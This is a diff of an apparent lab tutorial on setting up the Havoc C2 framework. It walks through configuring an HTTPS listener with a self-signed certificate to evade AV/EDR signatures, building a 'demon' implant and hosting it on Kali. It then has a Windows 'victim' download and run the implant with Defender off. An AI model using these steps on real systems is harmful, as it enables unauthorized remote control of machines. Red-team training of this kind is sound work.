@@ -71,7 +71,7 @@ Teamserver {
     Port = 40056
 
     Build {
-        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc" #latest version of kali this needs to be replaced
         Nasm = "/usr/bin/nasm"
     }
 }
@@ -140,7 +140,7 @@ enable havocserver.service
 sudo systemctl start havocserver.service 
 systemctl status havocserver.service
 "
-
+```
 # Running the client
 
 ![Screenshot](./images/havoc_newtab.jpg)
@@ -151,7 +151,7 @@ In your terminal open a new tab, then run the following command:
 ```code
 havoc client
 ```
-We can now log in to our teamserver using the user `Threatadmin` and the password whcih we defined in the custom Havoc C2 profile.
+We can now log in to our teamserver using the user `Threatadmin` and the password which we defined in the custom Havoc C2 profile.
 
 ![Screenshot](./images/havoc_login.jpg)
 
@@ -179,10 +179,12 @@ Let's add an HTTPs listener, click on `Add` and enter the listener configuration
 
 We can also add this to our Havoc profile, so that all these settings are applied when starting the team server. But before we do that, lets keep our OPSEC in mind, we need HTTPS - and we bettter not use the default SSL certificates, those might be signatured. 
 
-Let's create a self-signed SSL certifacate (PEM) and key file - Self signed certificates are of course not ideal - in a real world scenario we'd have them signed by a trusted PKI.
+Next we're going to create a self-signed SSL certificate (PEM) and key file - Self signed certificates are of course not ideal - in a real world scenario we'd have them signed by a trusted PKI.
 
 ```bash
-cd /opt/havoc/certs
+cd /opt/havoc/
+mkdir certs
+cd certs
 openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key
 ```
 Output:
@@ -205,7 +207,8 @@ Teamserver {
     Port = 40056
 
     Build {
-        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
         Nasm = "/usr/bin/nasm"
     }
 }
@@ -221,7 +224,7 @@ Operators {
 Listeners {
     Http {
         Name         = "HTTPs Listener"
-        Hosts        = ["10.0.0.7"]
+        Hosts        = ["kali"]
         #KillDate     = "2006-01-02 15:04:05" 
         #WorkingHours = "8:00-17:00"
         HostBind     = "0.0.0.0"
@@ -261,7 +264,7 @@ Demon {
 Now close your Havoc Teamserver and client in terminal (control-c) and start the teamserver again with your new profile:
 
 ```bash
-havoc server --profile /opt/havoc/profiles/https.yaotl -v --debug
+havoc server --profile /opt/havoc/profiles/https.yoatl -v --debug
 ```
 
 Open a second tab in your terminal and run:
@@ -270,19 +273,36 @@ Open a second tab in your terminal and run:
 havoc client
 ```
 
-On your windows machine when we browse with Chrome to the HTTPs listener (https://10.0.0.7:443), we'll now see our own custom self-signed certificate - one IOC less for AV/EDR to trigger on!
+Let's go and check if our profile has created the HTTPS listener - in the Havoc client go to `VIEW`, `Listeners`, select the HTTPs Listener and click on edit. You'll see the following (please note the host bind address will be different from the screenshot).
+
+![Screenshot](./images/havoc_httpslis.jpg)
+
+On your windows machine when we browse with Chrome to the HTTPs listener (https://10.0.0.7:443), we'll now see our own custom self-signed certificate - ***one IOC less for AV/EDR to trigger on! And C2 traffic is now encrypted!***
 
 ![Screenshot](./images/havoc_certswin.jpg)
 
-We'll create a vanilla demon payload as an executable, make sure all settings are like in the screenshot below (we'll go into the advanced evasion settings later on), save the payload in /opt/havoc/payloads directory:
+We'll create a vanilla demon payload as an executable, make sure all settings are like in the screenshot below (we'll go into the advanced evasion settings later on), save the payload in ***"/opt/havoc/payloads"*** directory:
 
 ![Screenshot](./images/havoc_payload.jpg)
 
-On your windows machine use `Chrome` and got to <http:\\YourKaliIP:9090\> and download the demon ("**demon.x64.exe**") to C:\Temp (this is whitelisted in MS Defender)
+On your kali machine, go your terminal and let's hosts this payload so we can download it on our windows victim machines:
 
-> IMPORTANT: For the time being turn your Windows Defender `OFF` (configure chrome to allow exe downloads, turn off smartscreen).
+```bash
+cd /opt/havoc/payloads
+updog2
+```
 
-We want to start with regular user privileges, so open a command prompt running as the unprivileged user `student`>
+![Screenshot](./images/havoc_kaliupdog.jpg)
+
+Now, on your windows machine use `Chrome` and go to <http:\\kali:9090\> and download the Havoc demon ("**demon.x64.exe**") to 
+
+> ***NOTE***: "C:\Temp" is is whitelisted in MS Defender, we will deal with AV Evasion later on, for now we just want to make sure our code executes and sets up a c2 connection.
+
+![Screenshot](./images/havoc_updog.jpg)
+
+> IMPORTANT: For the time being turn your Windows Defender `OFF`.
+
+We want to start with regular user privileges, so open a command prompt running as the unprivileged user `student`.
 
 ```powershell
 runas /user:student cmd.exe
@@ -290,14 +310,14 @@ runas /user:student cmd.exe
 
 Enter the password, and in the new command prompt you are now running as a regular user with medium integrity.
 
-SCREENSHOTS: whoami /all - systeminformer process integrity
+![Screenshot](./images/havoc_clistudent.jpg)
+
+Now from this new command prompt running as unprivileged user, execute the payload:
 
 ```powershell
 cd \temp
 demon.x64.exe
 ```
-
-![Screenshot](./images/havoc_updog.jpg)
 
 ![Screenshot](./images/havoc_demon.jpg)
 
